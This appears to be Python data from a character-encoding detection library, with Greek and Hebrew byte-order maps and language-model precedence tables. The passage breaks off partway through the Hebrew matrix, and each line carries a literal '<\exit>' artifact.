253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,<\exit>
78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,233, 90,253,253,253,253,253,253,253,253,253,253, 74,253,253,<\exit>
253,253,253,253,247,248, 61, 36, 46, 71, 73,253, 54,253,108,123,<\exit>
110, 31, 51, 43, 41, 34, 91, 40, 52, 47, 44, 53, 38, 49, 59, 39,<\exit>
35, 48,250, 37, 33, 45, 56, 50, 84, 57,120,121, 17, 18, 22, 15,<\exit>
124,  1, 29, 20, 21,  3, 32, 13, 25,  5, 11, 16, 10,  6, 30,  4,<\exit>
9,  8, 14,  7,  2, 12, 28, 23, 42, 24, 64, 75, 19, 26, 27,253,<\exit>
)<\exit>
win1253_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,<\exit>
79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,<\exit>
253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,<\exit>
78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,233, 61,253,253,253,253,253,253,253,253,253,253, 74,253,253,<\exit>
253,253,253,253,247,253,253, 36, 46, 71, 73,253, 54,253,108,123,<\exit>
110, 31, 51, 43, 41, 34, 91, 40, 52, 47, 44, 53, 38, 49, 59, 39,<\exit>
35, 48,250, 37, 33, 45, 56, 50, 84, 57,120,121, 17, 18, 22, 15,<\exit>
124,  1, 29, 20, 21,  3, 32, 13, 25,  5, 11, 16, 10,  6, 30,  4,<\exit>
9,  8, 14,  7,  2, 12, 28, 23, 42, 24, 64, 75, 19, 26, 27,253,<\exit>
)<\exit>
GreekLangModel = (<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,3,2,2,3,3,3,3,3,3,3,3,1,3,3,3,0,2,2,3,3,0,3,0,3,2,0,3,3,3,0,<\exit>
3,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,0,3,3,0,3,2,3,3,0,3,2,3,3,3,0,0,3,0,3,0,3,3,2,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,<\exit>
0,2,3,2,2,3,3,3,3,3,3,3,3,0,3,3,3,3,0,2,3,3,0,3,3,3,3,2,3,3,3,0,<\exit>
2,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,2,1,3,3,3,3,2,3,3,2,3,3,2,0,<\exit>
0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,0,3,3,3,3,3,3,0,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,2,3,3,0,<\exit>
2,0,1,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,2,3,0,0,0,0,3,3,0,3,1,3,3,3,0,3,3,0,3,3,3,3,0,0,0,0,<\exit>
2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,0,3,0,3,3,3,3,3,0,3,2,2,2,3,0,2,3,3,3,3,3,2,3,3,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,3,2,2,2,3,3,3,3,0,3,1,3,3,3,3,2,3,3,3,3,3,3,3,2,2,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,2,0,3,0,0,0,3,3,2,3,3,3,3,3,0,0,3,2,3,0,2,3,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,0,3,3,3,3,0,0,3,3,0,2,3,0,3,0,3,3,3,0,0,3,0,3,0,2,2,3,3,0,0,<\exit>
0,0,1,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,2,0,3,2,3,3,3,3,0,3,3,3,3,3,0,3,3,2,3,2,3,3,2,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,2,3,2,3,3,3,3,3,3,0,2,3,2,3,2,2,2,3,2,3,3,2,3,0,2,2,2,3,0,<\exit>
2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,3,0,0,0,3,3,3,2,3,3,0,0,3,0,3,0,0,0,3,2,0,3,0,3,0,0,2,0,2,0,<\exit>
0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,0,3,3,3,3,3,3,0,3,3,0,3,0,0,0,3,3,0,3,3,3,0,0,1,2,3,0,<\exit>
3,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,2,0,0,3,2,2,3,3,0,3,3,3,3,3,2,1,3,0,3,2,3,3,2,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,3,3,0,2,3,3,3,3,3,3,0,0,3,0,3,0,0,0,3,3,0,3,2,3,0,0,3,3,3,0,<\exit>
3,0,0,0,2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,0,3,3,3,3,3,3,0,0,3,0,3,0,0,0,3,2,0,3,2,3,0,0,3,2,3,0,<\exit>
2,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,3,1,2,2,3,3,3,3,3,3,0,2,3,0,3,0,0,0,3,3,0,3,0,2,0,0,2,3,1,0,<\exit>
2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,0,3,3,3,3,0,3,0,3,3,2,3,0,3,3,3,3,3,3,0,3,3,3,0,2,3,0,0,3,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,0,3,3,3,0,0,3,0,0,0,3,3,0,3,0,2,3,3,0,0,3,0,3,0,3,3,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,3,0,0,0,3,3,3,3,3,3,0,0,3,0,2,0,0,0,3,3,0,3,0,3,0,0,2,0,2,0,<\exit>
0,0,0,0,1,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,3,0,3,0,2,0,3,2,0,3,2,3,2,3,0,0,3,2,3,2,3,3,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,3,0,0,2,3,3,3,3,3,0,0,0,3,0,2,1,0,0,3,2,2,2,0,3,0,0,2,2,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,0,3,3,3,2,0,3,0,3,0,3,3,0,2,1,2,3,3,0,0,3,0,3,0,3,3,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,2,3,3,3,0,3,3,3,3,3,3,0,2,3,0,3,0,0,0,2,1,0,2,2,3,0,0,2,2,2,0,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,3,0,0,2,3,3,3,2,3,0,0,1,3,0,2,0,0,0,0,3,0,1,0,2,0,0,1,1,1,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,1,0,3,0,0,0,3,2,0,3,2,3,3,3,0,0,3,0,3,2,2,2,1,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,0,3,3,3,0,0,3,0,0,0,0,2,0,2,3,3,2,2,2,2,3,0,2,0,2,2,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,2,0,0,0,0,0,0,2,3,0,2,0,2,3,2,0,0,3,0,3,0,3,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,3,2,3,3,2,2,3,0,2,0,3,0,0,0,2,0,0,0,0,1,2,0,2,0,2,0,<\exit>
0,2,0,2,0,2,2,0,0,1,0,2,2,2,0,2,2,2,0,2,2,2,0,0,2,0,0,1,0,0,0,0,<\exit>
0,2,0,3,3,2,0,0,0,0,0,0,1,3,0,2,0,2,2,2,0,0,2,0,3,0,0,2,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,0,2,3,2,0,2,2,0,2,0,2,2,0,2,0,2,2,2,0,0,0,0,0,0,2,3,0,0,0,2,<\exit>
0,1,2,0,0,0,0,2,2,0,0,0,2,1,0,2,2,0,0,0,0,0,0,1,0,2,0,0,0,0,0,0,<\exit>
0,0,2,1,0,2,3,2,2,3,2,3,2,0,0,3,3,3,0,0,3,2,0,0,0,1,1,0,2,0,2,2,<\exit>
0,2,0,2,0,2,2,0,0,2,0,2,2,2,0,2,2,2,2,0,0,2,0,0,0,2,0,1,0,0,0,0,<\exit>
0,3,0,3,3,2,2,0,3,0,0,0,2,2,0,2,2,2,1,2,0,0,1,2,2,0,0,3,0,0,0,2,<\exit>
0,1,2,0,0,0,1,2,0,0,0,0,0,0,0,2,2,0,1,0,0,2,0,0,0,2,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,2,3,3,2,2,0,0,0,2,0,2,3,3,0,2,0,0,0,0,0,0,2,2,2,0,2,2,0,2,0,2,<\exit>
0,2,2,0,0,2,2,2,2,1,0,0,2,2,0,2,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,<\exit>
0,2,0,3,2,3,0,0,0,3,0,0,2,2,0,2,0,2,2,2,0,0,2,0,0,0,0,0,0,0,0,2,<\exit>
0,0,2,2,0,0,2,2,2,0,0,0,0,0,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,2,0,0,3,2,0,2,2,2,2,2,0,0,0,2,0,0,0,0,2,0,1,0,0,2,0,1,0,0,0,<\exit>
0,2,2,2,0,2,2,0,1,2,0,2,2,2,0,2,2,2,2,1,2,2,0,0,2,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
0,2,0,2,0,2,2,0,0,0,0,1,2,1,0,0,2,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,3,2,3,0,0,2,0,0,0,2,2,0,2,0,0,0,1,0,0,2,0,2,0,2,2,0,0,0,0,<\exit>
0,0,2,0,0,0,0,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,<\exit>
0,2,2,3,2,2,0,0,0,0,0,0,1,3,0,2,0,2,2,0,0,0,1,0,2,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,2,0,2,0,3,2,0,2,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
0,0,2,0,0,0,0,1,1,0,0,2,1,2,0,2,2,0,1,0,0,1,0,0,0,2,0,0,0,0,0,0,<\exit>
0,3,0,2,2,2,0,0,2,0,0,0,2,0,0,0,2,3,0,2,0,0,0,0,0,0,2,2,0,0,0,2,<\exit>
0,1,2,0,0,0,1,2,2,1,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,2,1,2,0,2,2,0,2,0,0,2,0,0,0,0,1,2,1,0,2,1,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,2,0,0,0,3,1,2,2,0,2,0,0,0,0,2,0,0,0,2,0,0,3,0,0,0,0,2,2,2,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,2,1,0,2,0,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,2,<\exit>
0,2,2,0,0,2,2,2,2,2,0,1,2,0,0,0,2,2,0,1,0,2,0,0,2,2,0,0,0,0,0,0,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,3,0,0,2,0,0,0,0,0,0,0,0,2,0,2,0,0,0,0,2,<\exit>
0,1,2,0,0,0,0,2,2,1,0,1,0,1,0,2,2,2,1,0,0,0,0,0,0,1,0,0,0,0,0,0,<\exit>
0,2,0,1,2,0,0,0,0,0,0,0,0,0,0,2,0,0,2,2,0,0,0,0,1,0,0,0,0,0,0,2,<\exit>
0,2,2,0,0,0,0,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,<\exit>
0,2,2,2,2,0,0,0,3,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,1,<\exit>
0,0,2,0,0,0,0,1,2,0,0,0,0,0,0,2,2,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,<\exit>
0,2,0,2,2,2,0,0,2,0,0,0,0,0,0,0,2,2,2,0,0,0,2,0,0,0,0,0,0,0,0,2,<\exit>
0,0,1,0,0,0,0,2,1,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,0,2,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,2,<\exit>
0,0,2,0,0,0,0,2,2,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,2,0,2,2,1,0,0,0,0,0,0,2,0,0,2,0,2,2,2,0,0,0,0,0,0,2,0,0,0,0,2,<\exit>
0,0,2,0,0,2,0,2,2,0,0,0,0,2,0,2,0,0,0,0,0,2,0,0,0,2,0,0,0,0,0,0,<\exit>
0,0,3,0,0,0,2,2,0,2,2,0,0,0,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,<\exit>
0,2,2,2,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,<\exit>
0,0,0,0,0,0,0,2,1,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,2,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
0,2,0,0,0,2,0,0,0,0,0,1,0,0,0,0,2,2,0,0,0,1,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,2,0,0,0,<\exit>
0,2,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,2,0,2,0,0,0,<\exit>
0,0,0,0,0,0,0,0,2,1,0,0,0,0,0,0,2,0,0,0,1,2,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
)<\exit>
Latin7GreekModel = {<\exit>
'charToOrderMap': Latin7_CharToOrderMap,<\exit>
'precedenceMatrix': GreekLangModel,<\exit>
'mTypicalPositiveRatio': 0.982851,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "ISO-8859-7"<\exit>
}<\exit>
Win1253GreekModel = {<\exit>
'charToOrderMap': win1253_CharToOrderMap,<\exit>
'precedenceMatrix': GreekLangModel,<\exit>
'mTypicalPositiveRatio': 0.982851,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "windows-1253"<\exit>
}<\exit>
from . import constants<\exit>
win1255_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253, 69, 91, 79, 80, 92, 89, 97, 90, 68,111,112, 82, 73, 95, 85,<\exit>
78,121, 86, 71, 67,102,107, 84,114,103,115,253,253,253,253,253,<\exit>
253, 50, 74, 60, 61, 42, 76, 70, 64, 53,105, 93, 56, 65, 54, 49,<\exit>
66,110, 51, 43, 44, 63, 81, 77, 98, 75,108,253,253,253,253,253,<\exit>
124,202,203,204,205, 40, 58,206,207,208,209,210,211,212,213,214,<\exit>
215, 83, 52, 47, 46, 72, 32, 94,216,113,217,109,218,219,220,221,<\exit>
34,116,222,118,100,223,224,117,119,104,125,225,226, 87, 99,227,<\exit>
106,122,123,228, 55,229,230,101,231,232,120,233, 48, 39, 57,234,<\exit>
30, 59, 41, 88, 33, 37, 36, 31, 29, 35,235, 62, 28,236,126,237,<\exit>
238, 38, 45,239,240,241,242,243,127,244,245,246,247,248,249,250,<\exit>
9,  8, 20, 16,  3,  2, 24, 14, 22,  1, 25, 15,  4, 11,  6, 23,<\exit>
12, 19, 13, 26, 18, 27, 21, 17,  7, 10,  5,251,252,128, 96,253,<\exit>
)<\exit>
HebrewLangModel = (<\exit>
0,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,3,2,1,2,0,1,0,0,<\exit>
3,0,3,1,0,0,1,3,2,0,1,1,2,0,2,2,2,1,1,1,1,2,1,1,1,2,0,0,2,2,0,1,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,<\exit>
1,2,1,2,1,2,0,0,2,0,0,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,<\exit>
1,2,1,3,1,1,0,0,2,0,0,0,1,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,0,1,2,2,1,3,<\exit>
1,2,1,1,2,2,0,0,2,2,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,2,2,2,2,3,2,<\exit>
1,2,1,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,2,3,2,2,3,2,2,2,1,2,2,2,2,<\exit>
1,2,1,1,2,2,0,1,2,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,0,2,2,2,2,2,<\exit>
0,2,0,2,2,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,0,2,2,2,<\exit>
0,2,1,2,2,2,0,0,2,1,0,0,0,0,1,0,1,0,0,0,0,0,0,2,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,2,1,2,3,2,2,2,<\exit>
1,2,1,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,0,<\exit>
3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,0,2,0,2,<\exit>
0,2,1,2,2,2,0,0,1,2,0,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,2,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,2,2,3,2,1,2,1,1,1,<\exit>
0,1,1,1,1,1,3,0,1,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,1,1,0,0,1,0,0,1,0,0,0,0,<\exit>
0,0,1,0,0,0,0,0,2,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,<\exit>
0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,2,3,3,3,2,1,2,3,3,2,3,3,3,3,2,3,2,1,2,0,2,1,2,<\exit>
0,2,0,2,2,2,0,0,1,2,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,2,3,3,3,1,2,2,3,3,2,3,2,3,2,2,3,1,2,2,0,2,2,2,<\exit>
0,2,1,2,2,2,0,0,1,2,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,1,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,2,2,2,3,3,3,3,1,3,2,2,2,<\exit>
0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,3,3,3,2,3,2,2,2,1,2,2,0,2,2,2,2,<\exit>
0,2,0,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,1,3,2,3,3,2,3,3,2,2,1,2,2,2,2,2,2,<\exit>
0,2,1,2,1,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,2,3,2,3,3,2,3,3,3,3,2,3,2,3,3,3,3,3,2,2,2,2,2,2,2,1,<\exit>
0,2,0,1,2,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,2,1,2,3,3,3,3,3,3,3,2,3,2,3,2,1,2,3,0,2,1,2,2,<\exit>
0,2,1,1,2,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,2,0,<\exit>
3,3,3,3,3,3,3,3,3,2,3,3,3,3,2,1,3,1,2,2,2,1,2,3,3,1,2,1,2,2,2,2,<\exit>
0,1,1,1,1,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,0,2,3,3,3,1,3,3,3,1,2,2,2,2,1,1,2,2,2,2,2,2,<\exit>
0,2,0,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,2,3,3,3,2,2,3,3,3,2,1,2,3,2,3,2,2,2,2,1,2,1,1,1,2,2,<\exit>
0,2,1,1,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,1,0,0,0,0,0,<\exit>
1,0,1,0,0,0,0,0,2,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,2,3,3,2,3,1,2,2,2,2,3,2,3,1,1,2,2,1,2,2,1,1,0,2,2,2,2,<\exit>
0,1,0,1,2,2,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,<\exit>
3,0,0,1,1,0,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,0,<\exit>
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,1,0,1,0,1,1,0,1,1,0,0,0,1,1,0,1,1,1,0,0,0,0,0,0,1,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
